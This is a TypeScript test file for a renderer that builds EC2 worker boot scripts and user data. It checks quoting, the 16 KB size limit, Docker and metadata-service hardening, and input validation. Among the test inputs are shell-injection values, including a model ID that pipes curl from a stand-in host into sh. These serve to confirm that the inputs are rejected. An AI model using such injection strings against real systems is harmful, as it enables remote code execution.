import { spawnSync } from "node:child_process";
import { randomBytes, randomUUID } from "node:crypto";
import { readFileSync } from "node:fs";
import { gunzipSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import {
  EC2_USER_DATA_MAX_BYTES,
  Ec2WorkerBootConfigSchema,
  ec2WorkerBootScript,
  ec2WorkerUserData,
  type Ec2WorkerBootConfig,
} from "../../packages/contracts/src/session.js";
import { SECRET_ARN_MAX_LENGTH } from "../../packages/contracts/src/model-providers.js";

const bootScript = readFileSync(new URL("../../packages/worker/ec2/boot.sh", import.meta.url), "utf8");
const workerLauncher = /cat >\/usr\/local\/libexec\/agentx-worker-start <<'LAUNCHER'\n([\s\S]*?)\nLAUNCHER/.exec(bootScript)?.[1] ?? "";

const config: Ec2WorkerBootConfig = {
  workspaceId: randomUUID(),
  generation: 2,
  volumeId: "vol-0123456789abcdef0",
  expectNewVolume: false,
  workerImage: `111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx/worker@sha256:${"b".repeat(64)}`,
  invokePublicKey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE+/9=",
  controlPlaneUrl: "https://abc123.execute-api.us-east-1.amazonaws.com",
  modelProvider: "amazon-bedrock",
  modelId: "arn:aws:bedrock:us-east-1:111122223333:inference-profile/us.anthropic.claude-sonnet-5-v1:0",
  promptCacheRetention: "short",
  logGroupName: "/agentx/production/worker",
};

describe("EC2 worker user data", () => {
  it("passes OpenRouter references to the container and rejects secrets or shell injection", () => {
    const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:agentx/test/openrouter-AbCdEf";
    const rendered = ec2WorkerBootScript({ ...config, openRouterSecretArn: secretArn, openRouterProviders: "anthropic,openai" }, bootScript);
    expect(rendered).toContain(`export AGENTX_OPENROUTER_SECRET_ARN='${secretArn}'`);
    expect(rendered).toContain("AGENTX_OPENROUTER_SECRET_ARN=${AGENTX_OPENROUTER_SECRET_ARN:-}");
    expect(rendered).not.toContain("OPENROUTER_API_KEY");
    expect(() => ec2WorkerBootScript({ ...config, openRouterSecretArn: "sk-key" }, bootScript)).toThrow();
    expect(() => ec2WorkerBootScript({ ...config, openRouterProviders: "anthropic';touch /tmp/bad" }, bootScript)).toThrow();
  });
  it.each([["anthropicSecretArn", "AGENTX_ANTHROPIC_SECRET_ARN", "ANTHROPIC_API_KEY"], ["openaiSecretArn", "AGENTX_OPENAI_SECRET_ARN", "OPENAI_API_KEY"]] as const)(
    "passes the %s reference to the container, never a key", (field, variable, keyVariable) => {
      const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:agentx/test/direct-AbCdEf";
      const rendered = ec2WorkerBootScript({ ...config, [field]: secretArn }, bootScript);
      expect(rendered).toContain(`export ${variable}='${secretArn}'`);
      expect(rendered).toContain(`${variable}=\${${variable}:-}`);
      expect(rendered).not.toContain(keyVariable);
      expect(ec2WorkerBootScript(config, bootScript)).not.toContain(`export ${variable}=`);
      expect(() => ec2WorkerBootScript({ ...config, [field]: "sk-ant-api03-key" }, bootScript)).toThrow();
      expect(() => ec2WorkerBootScript({ ...config, [field]: `${secretArn}';touch /tmp/bad` }, bootScript)).toThrow();
    });
  it("prepends every boot value to the script as a quoted export", () => {
    const userData = ec2WorkerBootScript(config, bootScript);
    expect(userData.startsWith("#!/bin/bash\n")).toBe(true);
    expect(userData.match(/^#!/gm)).toHaveLength(2);
    expect(userData).toContain("cat >/usr/local/libexec/agentx-worker-start <<'LAUNCHER'\n#!/bin/bash");
    expect(userData).toContain(`export AGENTX_WORKSPACE_ID='${config.workspaceId}'`);
    expect(userData).toContain("export AGENTX_SESSION_GENERATION='2'");
    expect(userData).toContain("export AGENTX_EXPECT_NEW_VOLUME='false'");
    expect(userData).toContain(`export AGENTX_MODEL_ID='${config.modelId}'`);
    expect(userData).toContain("export PI_CACHE_RETENTION='short'");
    expect(userData.endsWith("main \"$@\"\n")).toBe(true);
  });

  it("sends the boot script as base64 gzip user data that cloud-init unpacks to exactly that script (#229)", () => {
    const encoded = ec2WorkerUserData(config, bootScript);
    expect(encoded).toMatch(/^[A-Za-z0-9+/]+={0,2}$/);
    const raw = Buffer.from(encoded, "base64");
    // cloud-init recognizes gzip user data by its magic bytes and decompresses it before running it.
    expect([...raw.subarray(0, 2)]).toEqual([0x1f, 0x8b]);
    expect(gunzipSync(raw).toString("utf8")).toBe(ec2WorkerBootScript(config, bootScript));
  });

  it("leaves real headroom under EC2's 16 KB user data limit with every value at its maximum (#223, #229)", () => {
    // Random letters and digits barely compress, so this is the largest user data the schema admits.
    const noise = (length: number) => {
      const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      return [...randomBytes(length)].map((byte) => alphabet[byte % alphabet.length]).join("");
    };
    const lower = (length: number) => noise(length).toLowerCase();
    const secretPrefix = "arn:aws:secretsmanager:us-east-1:123456789012:secret:";
    const worstCase = Ec2WorkerBootConfigSchema.parse({
      ...config,
      generation: Number.MAX_SAFE_INTEGER,
      invokePublicKey: noise(1_024),
      controlPlaneUrl: `https://${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(56)}`,
      modelProvider: noise(128),
      modelId: noise(256),
      openRouterSecretArn: `${secretPrefix}${noise(2_048 - secretPrefix.length)}`,
      openRouterProviders: [...Array.from({ length: 6 }, () => lower(80)), lower(26)].join(","),
      anthropicSecretArn: `${secretPrefix}${noise(SECRET_ARN_MAX_LENGTH - secretPrefix.length)}`,
      openaiSecretArn: `${secretPrefix}${noise(SECRET_ARN_MAX_LENGTH - secretPrefix.length)}`,
      logGroupName: `/${noise(511)}`,
    });
    expect(worstCase.controlPlaneUrl).toHaveLength(512);
    expect(worstCase.openRouterProviders).toHaveLength(512);
    expect(worstCase.anthropicSecretArn).toHaveLength(SECRET_ARN_MAX_LENGTH);
    const compressed = Buffer.from(ec2WorkerUserData(worstCase, bootScript), "base64").length;
    // EC2 measures user data before base64 encoding; at least 4 KB of it stays free for boot changes.
    expect(compressed).toBeLessThanOrEqual(EC2_USER_DATA_MAX_BYTES - 4_096);
  });

  it("measures the limit on the compressed user data, not the script (#229)", () => {
    const longScript = `${bootScript}${"#".repeat(EC2_USER_DATA_MAX_BYTES)}\n`;
    expect(Buffer.byteLength(ec2WorkerBootScript(config, longScript))).toBeGreaterThan(EC2_USER_DATA_MAX_BYTES);
    expect(Buffer.from(ec2WorkerUserData(config, longScript), "base64").length).toBeLessThan(EC2_USER_DATA_MAX_BYTES);
  });

  it("refuses to render user data EC2 would reject for its size (#223)", () => {
    // Random bytes do not compress, so this pushes the compressed user data past the limit.
    const incompressible = `${bootScript}# ${randomBytes(EC2_USER_DATA_MAX_BYTES).toString("base64")}\n`;
    expect(() => ec2WorkerUserData(config, incompressible)).toThrow(/worker user data is \d+ bytes compressed; EC2 allows less than 16384/);
  });

  it("exports exactly the variables the boot script requires", () => {
    const required = /for name in ([\s\S]*?); do/.exec(bootScript)?.[1]?.split(/[\s\\]+/).filter(Boolean) ?? [];
    const exported = [...ec2WorkerBootScript(config, bootScript).matchAll(/^export (\w+)=/gm)].map((match) => match[1]);
    expect(required.length).toBeGreaterThan(0);
    expect(exported.sort()).toEqual(required.sort());
  });

  it("gives the worker the host's Docker and keeps Docker's data on the workspace volume (#121)", () => {
    expect(bootScript).toContain("readonly DOCKER_DATA_ROOT=$MOUNT_PATH/.docker");
    expect(bootScript).toContain(`printf '{"data-root": "%s"}\\n' "$DOCKER_DATA_ROOT" >/etc/docker/daemon.json`);
    // The daemon starts only after the workspace is mounted, so its data root is on the volume.
    expect(bootScript.indexOf("mount_workspace \"$device\"")).toBeLessThan(bootScript.indexOf("  ensure_docker\n"));
    expect(workerLauncher).toContain('args=(run --rm --name "$WORKER_CONTAINER" --network host --env-file "$WORKER_ENV_FILE" --volume "$MOUNT_PATH:$MOUNT_PATH")');
    expect(workerLauncher).toContain('args+=(--volume "$RUNTIME_ROOT:$RUNTIME_ROOT" --env CONTAINED_FOUNDATION_EVIDENCE_DIR="$RUNTIME_ROOT/evidence" --env TMPDIR="$RUNTIME_ROOT/tmp")');
    expect(workerLauncher).toContain("args+=(--env TMPDIR=/tmp)");
    expect(bootScript).toContain("ExecStart=/usr/local/libexec/agentx-worker-start");
    expect(bootScript).toContain("RequiresMountsFor=$MOUNT_PATH");
  });

  it("prepares fixed private EBS runtime paths and retries the pinned contained image before starting the worker", () => {
    expect(bootScript).toContain('readonly RUNTIME_SOURCE=$MOUNT_PATH/.agentx-runtime');
    expect(bootScript).toContain('readonly RUNTIME_ROOT=/mnt/agentx-runtime');
    expect(bootScript).toContain('mount --bind "$RUNTIME_SOURCE" "$RUNTIME_ROOT"');
    expect(bootScript).toContain('readonly CANDIDATE_SCRATCH_ROOT=$RUNTIME_ROOT/candidates');
    expect(bootScript).toContain('readonly EVIDENCE_ROOT=$RUNTIME_ROOT/evidence');
    expect(bootScript).toContain('readonly CONTAINED_STATE_ROOT=$RUNTIME_ROOT/state');
    expect(bootScript).toContain('install -d -o "$WORKER_UID" -g "$WORKER_GID" -m 0700 "$RUNTIME_SOURCE/$path"');
    expect(bootScript).toContain('verifier unavailable; setup smoke withheld');
    expect(bootScript).toContain("printf 'TMPDIR=/tmp\\n'");
    expect(workerLauncher).toContain('args+=(--volume "$RUNTIME_ROOT:$RUNTIME_ROOT" --env CONTAINED_FOUNDATION_EVIDENCE_DIR="$RUNTIME_ROOT/evidence" --env TMPDIR="$RUNTIME_ROOT/tmp")');
    expect(workerLauncher).toContain("args+=(--env TMPDIR=/tmp)");
    expect(bootScript).toContain('docker pull "$CONTAINED_IMAGE"');
    expect(bootScript).toContain('optional verifier image unavailable; worker continues');
    expect(bootScript).toContain('pull_contained_image || true');
    expect(bootScript.indexOf('prepare_contained_runtime_directories')).toBeLessThan(bootScript.indexOf('pull_worker_image "$region"'));
    expect(bootScript.indexOf('pull_contained_image')).toBeLessThan(bootScript.indexOf('write_worker_unit "$region"'));
  });

  it("keeps containers off the instance metadata service and pulls the executor image after the worker image", () => {
    expect(bootScript).toContain("iptables -I DOCKER-USER -d 169.254.169.254/32 -j DROP");
    // The rule is idempotent: a -C check comes first, and a failure to install it stops the boot.
    expect(bootScript).toContain("iptables -C DOCKER-USER -d 169.254.169.254/32 -j DROP 2>/dev/null || iptables -I DOCKER-USER");
    expect(bootScript).toContain('fail "could not block container access to the instance metadata service"');
    // DOCKER-USER exists only once the daemon is running.
    expect(bootScript.indexOf("systemctl restart docker.service")).toBeLessThan(bootScript.indexOf("  block_container_metadata_access\n}"));
    expect(bootScript).toContain('docker pull "$EXECUTOR_IMAGE"');
    // Unset until the control plane sets it: the pull is skipped, never a boot failure.
    expect(bootScript).toContain('[[ -n "${EXECUTOR_IMAGE:-}" ]] || return 0');
    expect(bootScript).toContain("pull_executor_image || true");
    expect(bootScript.indexOf('pull_worker_image "$region"')).toBeLessThan(bootScript.indexOf("pull_executor_image || true"));
    expect(bootScript.indexOf("pull_executor_image || true")).toBeLessThan(bootScript.indexOf('write_worker_unit "$region"'));
  });

  it("renders a script bash accepts", () => {
    const checked = spawnSync("bash", ["-n"], { input: ec2WorkerBootScript(config, bootScript), encoding: "utf8" });
    expect(checked.status, checked.stderr).toBe(0);
  });

  it.each([
    ["a model ID that breaks out of its quotes", { modelId: "x'; curl evil.test | sh; '" }],
    ["a model ID with a space", { modelId: "claude sonnet" }],
    ["a control plane URL over plain HTTP", { controlPlaneUrl: "http://control.example.test" }],
    ["a control plane URL with a quote", { controlPlaneUrl: "https://control.example.test/'x" }],
    ["an image pinned by tag", { workerImage: "111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx-worker:latest" }],
    ["an image outside ECR", { workerImage: `docker.io/library/node@sha256:${"c".repeat(64)}` }],
    ["a public key with a newline", { invokePublicKey: "MFkw\nEwYH" }],
    ["a log group with a space", { logGroupName: "/agentx/worker logs" }],
    ["a generation of 0", { generation: 0 }],
    ["an unknown cache retention", { promptCacheRetention: "forever" }],
  ])("refuses %s", (_name, override) => {
    expect(() => ec2WorkerBootScript({ ...config, ...override } as Ec2WorkerBootConfig, bootScript)).toThrow();
    expect(() => ec2WorkerUserData({ ...config, ...override } as Ec2WorkerBootConfig, bootScript)).toThrow();
  });

  it("refuses unknown fields", () => {
    expect(() => Ec2WorkerBootConfigSchema.parse({ ...config, extra: "x" })).toThrow();
  });
});
